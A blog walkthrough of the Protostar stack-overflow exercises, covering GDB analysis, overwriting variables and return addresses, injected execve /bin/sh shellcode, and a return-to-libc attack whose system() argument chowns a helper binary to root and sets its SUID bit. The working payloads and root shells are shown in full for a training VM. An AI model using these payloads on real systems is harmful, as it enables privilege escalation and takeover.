---
layout: post
title: Protostar Walkthrough - Stack
---

Protostar is a virtual machine from [Exploit Exercises][exploit-exercises] that
goes through basic memory corruption issues. It is a step up from Nebula,
another virtual machine from Exploit Exercises that I have
[written about][nebula-writeup] previously.

Quoting from the website,

> Protostar introduces the following in a friendly way:
> * Network programming
> * Byte order
> * Handling sockets
> * Stack overflows
> * Format strings
> * Heap overflows
>
> The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.
>
> In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.

The sha1sum of the ISO I am working with is d030796b11e9251f34ee448a95272a4d432cf2ce.

This blog post will cover the stack exploitation exercises. The later stages of
Protostar will be covered in another post.

{:toc}

# stack 0

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

```shell
user@protostar:~$ /opt/protostar/bin/stack0
AAAA
Try again?
```

We open up the `stack0` binary in GDB and disassemble the main function.

```shell
(gdb) disass main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   %ebp
0x080483f5 <main+1>:    mov    %esp,%ebp
0x080483f7 <main+3>:    and    $0xfffffff0,%esp
0x080483fa <main+6>:    sub    $0x60,%esp
0x080483fd <main+9>:    movl   $0x0,0x5c(%esp)
0x08048405 <main+17>:   lea    0x1c(%esp),%eax
0x08048409 <main+21>:   mov    %eax,(%esp)
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    0x5c(%esp),%eax
0x08048415 <main+33>:   test   %eax,%eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   movl   $0x8048500,(%esp)
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   movl   $0x8048529,(%esp)
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
```

The first four lines of the disassembly is the function prologue and isn't very
interesting.

The first interesting line is the fifth line. This line moves the value `0x0`
to the memory address `$esp + 0x5c`.

```shell
0x080483fd <main+9>:    movl   $0x0,0x5c(%esp)
```

This is probably the `modified` variable especially since that memory
address is checked at a later point to see if it's set to 0 using the common
`test $eax, $eax` idiom.

```shell
0x08048411 <main+29>:   mov    0x5c(%esp),%eax
0x08048415 <main+33>:   test   %eax,%eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
```

The next few lines tells us that the `buffer` array starts at the memory
address `$esp + 0x1c`.

```shell
0x08048405 <main+17>:   lea    0x1c(%esp),%eax
0x08048409 <main+21>:   mov    %eax,(%esp)
0x0804840c <main+24>:   call   0x804830c <gets@plt>
```

Given that `0x5c - 0x1c` is 64 bytes, we see that `buffer` and `modified`
are allocated right next to each other on the stack.

We can modify the `modified` variable by writing past the space allocated for
`buffer`. We can do that by passing in a large input via stdin since the `gets`
function does not perform any bounds checking.

```shell
user@protostar:~$ python -c "print 'A' * 65" | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```

# stack 1

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

This is pretty similar to the previous level except that the data is passed in
via `argv` instead of stdin and we need to write a specific value `0x61626364`
to `modified` instead of any non zero value.

```shell
user@protostar:~$ python -c "print 'A' * 65" | xargs /opt/protostar/bin/stack1
Try again, you got 0x00000041
```

We see that the ASCII value of the character "A" is written to the memory
location reserved for `modified`. We notice that the value is written to the
least significant byte of `modified`. This is because x86 is a
[little-endian][wikipedia-endianness] based system.

This means that we can write 4 bytes past the space allocated for `buffer` to
contain whatever byte value we want. We look up the ASCII characters for
`0x61626364` which corresponds to `dcba` (remember, little-endian).

```shell
user@protostar:~$ python -c "print 'A' * 64 + 'dcba'" | xargs /opt/protostar/bin/stack1
you have correctly got the variable to the right value
```

# stack 2

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Again, this is pretty similar to the previous level except that the data is
passed in via the enviromental variable `GREENIE` and we need to write
`0x0d0a0d0a` to `modified`.

```shell
user@protostar:~$ GREENIE=`python -c "print 'A' * 65"` /opt/protostar/bin/stack2
Try again, you got 0x00000041
```

Given that `0x0a` and `0x0d` are special ASCII characters, we cannot print it
out directly. However, there is a way in Python to print out the raw byte
values that we need.

```shell
user@protostar:~$ GREENIE=`python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'"` /opt/protostar/bin/stack2
you have correctly modified the variable
```

# stack 3

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

Our goal here is to execute the `win()` function.

We open up the `stack3` binary in GDB.

```shell
(gdb) disass main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   %ebp
0x08048439 <main+1>:    mov    %esp,%ebp
0x0804843b <main+3>:    and    $0xfffffff0,%esp
0x0804843e <main+6>:    sub    $0x60,%esp
0x08048441 <main+9>:    movl   $0x0,0x5c(%esp)
0x08048449 <main+17>:   lea    0x1c(%esp),%eax
0x0804844d <main+21>:   mov    %eax,(%esp)
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmpl   $0x0,0x5c(%esp)
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    $0x8048560,%eax
0x08048461 <main+41>:   mov    0x5c(%esp),%edx
0x08048465 <main+45>:   mov    %edx,0x4(%esp)
0x08048469 <main+49>:   mov    %eax,(%esp)
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    0x5c(%esp),%eax
0x08048475 <main+61>:   call   *%eax
0x08048477 <main+63>:   leave
0x08048478 <main+64>:   ret
End of assembler dump.
```

The stack layout in this program is exactly the same as the previous ones. The
`fp` variable is located at memory address `$esp + 0x5c` and `buffer` starts
at `$esp + 0x1c`

The interesting bit in this program is the following two lines:

```shell
0x08048471 <main+57>:   mov    0x5c(%esp),%eax
0x08048475 <main+61>:   call   *%eax
```

We see that the the value of `fp` is moved to `$eax` and is called. If we can
modify the value of `fp` to point to the memory location of `win()`, we will
have completed this stage.

In the disassembly of `win()`, we see that the function starts at `0x08048424`.

```shell
(gdb) disass win
Dump of assembler code for function win:
0x08048424 <win+0>:     push   %ebp
0x08048425 <win+1>:     mov    %esp,%ebp
0x08048427 <win+3>:     sub    $0x18,%esp
0x0804842a <win+6>:     movl   $0x8048540,(%esp)
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave
0x08048437 <win+19>:    ret
End of assembler dump.
```

We overwrite `fp` with `\x24\x84\x04\x08`. Remember, little-endian.

```shell
user@protostar:~$ python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | /opt/protostar/bin/stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

# stack 4

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Our goal here is to execute the `win()` function by gaining control of `$eip`.

We open the `stack4` binary in GDB.

```shell
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   %ebp
0x08048409 <main+1>:    mov    %esp,%ebp
0x0804840b <main+3>:    and    $0xfffffff0,%esp
0x0804840e <main+6>:    sub    $0x50,%esp
0x08048411 <main+9>:    lea    0x10(%esp),%eax
0x08048415 <main+13>:   mov    %eax,(%esp)
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
```

To understand how to exploit this, we will need a crash course on x86 calling
conventions. The `call` instruction pushes the current `$eip` onto the stack
before jumping to the memory address of the called function by setting `$eip` to
that address. The function prologue then sets up the new stack frame by
setting `$ebp` and `$esp` to the appropriate values.

This is what the stack roughly looks like after the function prologue.

<img src="assets/protostar-stack4-diagram.png" alt="Stack Diagram" class="center-image" >

The `ret` instruction at the end of the function will pop the old EIP value,
located on the stack at `$ebp + 4`, and restore it to the `$eip` register. We
can overwrite this memory location with the memory address we want `$eip` to be
at after the `ret` instruction.

```shell
(gdb) info reg
eax            0xbffff740       -1073744064
ecx            0xbffff740       -1073744064
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff730       0xbffff730
ebp            0xbffff788       0xbffff788
esi            0x0      0
edi            0x0      0
eip            0x804841d        0x804841d <main+21>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

We know that `buffer` starts at `$esp + 0x10`. This means that we need to write
76 (`(0xbffff788 + 4) - (0xbffff730 + 0x10)`) bytes plus the 4 bytes we want
`$eip` to be at after the `ret` instruction.

In the disassembly of `win()`, we see that the function starts at `0x080483f4`.

```shell
(gdb) disass win
Dump of assembler code for function win:
0x080483f4 <win+0>:     push   %ebp
0x080483f5 <win+1>:     mov    %esp,%ebp
0x080483f7 <win+3>:     sub    $0x18,%esp
0x080483fa <win+6>:     movl   $0x80484e0,(%esp)
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave
0x08048407 <win+19>:    ret
End of assembler dump.
```

Putting it all together,

```shell
user@protostar:~$ python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | /opt/protostar/bin/stack4
code flow successfully changed
Segmentation fault
```

The program segfaults after executing `win()` because the stack is messed up
when it tries to `ret` from the function. However, this generally does not pose
a problem for exploitation.

# stack 5

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

This is pretty similar to the previous level except that our goal here is to
execute [shellcode][wikipedia-shellcode]. As writing shellcodes is beyond the
scope of this exercise, we will use a `execve /bin/sh` shellcode from
[exploit-db.com][exploit-db-13357]. Due to the fact that we are reading input
using `gets()`, we pick this particular shellcode because it re-opens `stdin`.
A normal `execve /bin/sh` shell code will simply exit after running `/bin/sh`.

We open up the `stack5` binary in GDB.

```shell
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x50,%esp
0x080483cd <main+9>:    lea    0x10(%esp),%eax
0x080483d1 <main+13>:   mov    %eax,(%esp)
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.

(gdb) info reg
eax            0xbffff740       -1073744064
ecx            0xbffff740       -1073744064
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff730       0xbffff730
ebp            0xbffff788       0xbffff788
esi            0x0      0
edi            0x0      0
eip            0x80483d9        0x80483d9 <main+21>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

We see that the disassembly and relevant register values are exactly the same
as the previous levels. Reusing the calculations from before, we know that
`buffer` starts at `$esp + 0x10` and that we need to write 76 bytes + the
4 bytes we want `$eip` to be at after the `ret` instruction.

```shell
(gdb) run
Starting program: /opt/protostar/bin/stack5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info reg
eax            0xbffff740       -1073744064
ecx            0xbffff740       -1073744064
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff790       0xbffff790
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x42424242       0x42424242
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

We confirm that we can overwrite `$eip` with the memory address that we want.
We also have a 76 byte buffer that we can use to store our shellcode.

However, we now face a problem where we do not know the exact memory location
of `$esp + 0x10` to overwrite `$eip` with. Simply using the value we see in GDB
is not reliable as the exact memory address on the stack can change depending
on how the binary is loaded.

We see that the memory location we want to jump to is actually loaded into
`$eax` during execution. So, if we can locate a `jmp $eax` instruction at a
static location in the program's address space, we can point `$eip` to that
location to execute our shellcode.

```shell
0x080483cd <main+9>:    lea    0x10(%esp),%eax
```

There are many tools to find such "gadgets" in the program's address space. We
will use `msfelfscan` for this example (you can find a copy at
`/usr/share/framework2/msfelfscan` on Kali Linux).

```shell
$ /usr/share/framework2/msfelfscan -f stack5 -j eax
0x080483bf   call eax
0x0804846b   call eax
```

Placing our shellcode at the start of the buffer and replacing "BBBB" with the
memory address of our `call eax` instruction, we get the following payload.

```shell
user@protostar:~$ python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 21 + '\xbf\x83\x04\x08'" | /opt/protostar/bin/stack5
Segmentation fault
```

Looking in GDB, we see that the last 11 bytes of our shellcode was overwritten
during execution. This is a result of the `push` instructions in the shellcode
writing values onto the stack.

```shell
(gdb) x/20x 0xbffff740
0xbffff740:     0xdb31c031      0x80cd06b0      0x742f6853      0x2f687974
0xbffff750:     0x89766564      0x66c931e3      0xb02712b9      0x3180cd05
0xbffff760:     0x2f6850c0      0x6868732f      0x6e69622f      0xbffff774
0xbffff770:     0x00000000      0x6e69622f      0x68732f2f      0x00000000
0xbffff780:     0x7665642f      0x7974742f      0x00000000      0x080483c1
```

We can fix this by adding a `add $0x10, $esp` instruction to our shellcode to
expand the stack. The instruction translates to `\x83\xc4\x10` in machine code.
Modifying our payload, we end up with a successful exploit.

```shell
user@protostar:~$ python -c "print '\x83\xc4\x10\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 18 + '\xbf\x83\x04\x08'" | /opt/protostar/bin/stack5
# whoami
root
```

# stack 6

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

We see that while the code is very similar to the previous level, we are unable
to overwrite `$eip` with an arbitrary address due to the `ret & 0xbf000000`
check. We take a look at the disassembly of `getpath()` in GDB.

```shell
(gdb) disass getpath
Dump of assembler code for function getpath:
0x08048484 <getpath+0>: push   %ebp
0x08048485 <getpath+1>: mov    %esp,%ebp
0x08048487 <getpath+3>: sub    $0x68,%esp
0x0804848a <getpath+6>: mov    $0x80485d0,%eax
0x0804848f <getpath+11>:        mov    %eax,(%esp)
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    0x8049720,%eax
0x0804849c <getpath+24>:        mov    %eax,(%esp)
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    -0x4c(%ebp),%eax
0x080484a7 <getpath+35>:        mov    %eax,(%esp)
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    0x4(%ebp),%eax
0x080484b2 <getpath+46>:        mov    %eax,-0xc(%ebp)
0x080484b5 <getpath+49>:        mov    -0xc(%ebp),%eax
0x080484b8 <getpath+52>:        and    $0xbf000000,%eax
0x080484bd <getpath+57>:        cmp    $0xbf000000,%eax
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    $0x80485e4,%eax
0x080484c9 <getpath+69>:        mov    -0xc(%ebp),%edx
0x080484cc <getpath+72>:        mov    %edx,0x4(%esp)
0x080484d0 <getpath+76>:        mov    %eax,(%esp)
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        movl   $0x1,(%esp)
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    $0x80485f0,%eax
0x080484e9 <getpath+101>:       lea    -0x4c(%ebp),%edx
0x080484ec <getpath+104>:       mov    %edx,0x4(%esp)
0x080484f0 <getpath+108>:       mov    %eax,(%esp)
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave
0x080484f9 <getpath+117>:       ret
End of assembler dump.
```

We immediately see that `buffer` starts at `-0x4c(%ebp)`, which means that we
need to write 80 bytes (`0x4c` + 4 bytes for the old `$ebp`) plus the 4 bytes
we want `$eip` to be at after the `ret` instruction. This makes sense because
4 more bytes is allocated on the stack (compared to the previous level) to
store the `unsigned int ret` variable.

```shell
(gdb) run
Starting program: /opt/protostar/bin/stack6
input path please: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Now, let's take a look at what the `ret & 0xbf000000` does exactly. We can see
from GDB that the stack is mapped to the memory between `0xbffeb000` and
`0xc0000000`. The check essentially prevents us from returning directly to a
memory address on the stack. You can think of this as a crude implementation of
a non-executable stack.

```shell
(gdb) info proc map
process 2715
cmdline = '/opt/protostar/bin/stack6'
cwd = '/tmp'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fde000 0xb7fe2000     0x4000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```

The first idea to defeat this protection is that we can use the same trick from
stack 5 to indirectly jump to our shellcode. We see that `-0x4c(%ebp)`, which
is the start of `buffer` is loaded into `$edx` right before the `ret`
instruction. However, this does not work as the binary does not contain any
`jmp $edx` gadgets.

One useful exploitation technique on Linux systems that we can use here is
return-to-libc. This technique works by calling a function that is already
present in the process memory, which removes the need to inject shellcode onto
the stack. While any function present in the process memory can be used, libc
is usually the target as it is almost always linked and contains functions like
`system()` that can be used to execute shell commands.

With GDB, we can locate the location of the `system()` function.

```shell
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```

Next, we need to control the parameters of `system()`. The libc calling
convention uses the stack to pass parameters. This is how the stack looks:

```shell
[random stack data][$eip - address of system()][return address][address of parameter]
```

So, how do we control the parameter that gets passed to `system()`? While there
are multiple ways of doing this, the easiest on a machine without ASLR is
using environmental variables as they are pushed onto the stack during program
initialization.

We can use `getenv.c` (compile it with `gcc getenv.c -o getenv`) to locate the
memory address of the environmental variable.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;

    if (argc < 3) {
        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
        exit(0);
    } else {
        ptr = getenv(argv[1]); /* Get environment variable location */
        ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; /* Adjust for program name */
        printf("%s will be at %p\n", argv[1], ptr);
    }
}
```

Now that we have a method of passing a parameter to `system()`, what shell
command do we want to run? For many binaries, a simple `/bin/sh` will get us a
shell. However, due to the fact that the example uses `gets()`, we will need to
do more work if we do not want the shell to terminate immediatly.

A far simpler method is to have our exploit set the SUID bit on a binary that
calls `/bin/bash`. First, we write our `shell.c`.

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
```

Next, we compile it.

```shell
user@protostar:~$ gcc shell.c -o shell
```

We set the environmental variable `SHELLME` to the shell command we want to
execute. In this case, we will set the owner of `/home/user/shell` to root and
give it the SUID bit.

```shell
user@protostar:~$ export SHELLME="/bin/chown root:root /home/user/shell; /bin/chmod 4755 /home/user/shell"
user@protostar:~$ ./getenv SHELLME /opt/protostar/bin/stack6
SHELLME will be at 0xbfffff16
```

Remember the "return address" bit of the stack from earlier? That is where our
program will jump to after `system()` is done. While it has no bearing on
successful exploitation, we can set it to the `exit()` function to exit
cleanly.

```shell
(gdb) print exit
$1 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

Putting it all together, we end up with a working exploit.

```shell
user@protostar:~$ python -c "print 'A' * 80 + '\xb0\xff\xec\xb7' + '\xc0\x60\xec\xb7' + '\x16\xff\xff\xbf'" | /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
user@protostar:~$ ./shell
root@protostar:~# whoami
root
```

# stack 7

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

This is similar to stack 6 except that the filter is even more restrictive.
This time, the only location we can overwrite `$eip` is within the `stack7`
binary itself.

```shell
(gdb) info proc map
process 4061
cmdline = '/opt/protostar/bin/stack7'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack7'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```

We take a look at the disassembly of `getpath()`.

```shell
(gdb) disass getpath
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>: push   %ebp
0x080484c5 <getpath+1>: mov    %esp,%ebp
0x080484c7 <getpath+3>: sub    $0x68,%esp
0x080484ca <getpath+6>: mov    $0x8048620,%eax
0x080484cf <getpath+11>:        mov    %eax,(%esp)
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:        mov    0x8049780,%eax
0x080484dc <getpath+24>:        mov    %eax,(%esp)
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:        lea    -0x4c(%ebp),%eax
0x080484e7 <getpath+35>:        mov    %eax,(%esp)
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:        mov    0x4(%ebp),%eax
0x080484f2 <getpath+46>:        mov    %eax,-0xc(%ebp)
0x080484f5 <getpath+49>:        mov    -0xc(%ebp),%eax
0x080484f8 <getpath+52>:        and    $0xb0000000,%eax
0x080484fd <getpath+57>:        cmp    $0xb0000000,%eax
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:        mov    $0x8048634,%eax
0x08048509 <getpath+69>:        mov    -0xc(%ebp),%edx
0x0804850c <getpath+72>:        mov    %edx,0x4(%esp)
0x08048510 <getpath+76>:        mov    %eax,(%esp)
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:        movl   $0x1,(%esp)
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:        mov    $0x8048640,%eax
0x08048529 <getpath+101>:       lea    -0x4c(%ebp),%edx
0x0804852c <getpath+104>:       mov    %edx,0x4(%esp)
0x08048530 <getpath+108>:       mov    %eax,(%esp)
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    -0x4c(%ebp),%eax
0x0804853b <getpath+119>:       mov    %eax,(%esp)
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave
0x08048544 <getpath+128>:       ret
End of assembler dump.
```

Similar to stack 6, `buffer` starts at `-0x4c(%ebp)` and we need to write 84
bytes to overwrite `$eip`. We can confirm this in GDB.

```shell
(gdb) run
Starting program: /opt/protostar/bin/stack7
input path please: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

We see that `-0x4c(%ebp)` is loaded into `$eax` right before the `ret`
instruction. This time, the binary does contain the gadget that we need.

```shell
$ /usr/share/framework2/msfelfscan -f stack7 -j eax
0x080484bf   call eax
0x080485eb   call eax
```

We use the same payload from stack 5, with the modified `call eax` instruction
which gives us successful exploitation.

```shell
user@protostar:~$ python -c "print '\x83\xc4\x10\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 22 + '\xbf\x84\x04\x08'" | /opt/protostar/bin/stack7
# whoami
root
```

[exploit-exercises]: https://exploit-exercises.com
[nebula-writeup]: 2018-01-01-nebula-walkthrough
[wikipedia-endianness]: https://en.wikipedia.org/wiki/Endianness
[wikipedia-shellcode]: https://en.wikipedia.org/wiki/Shellcode
[exploit-db-13357]: https://www.exploit-db.com/exploits/13357/
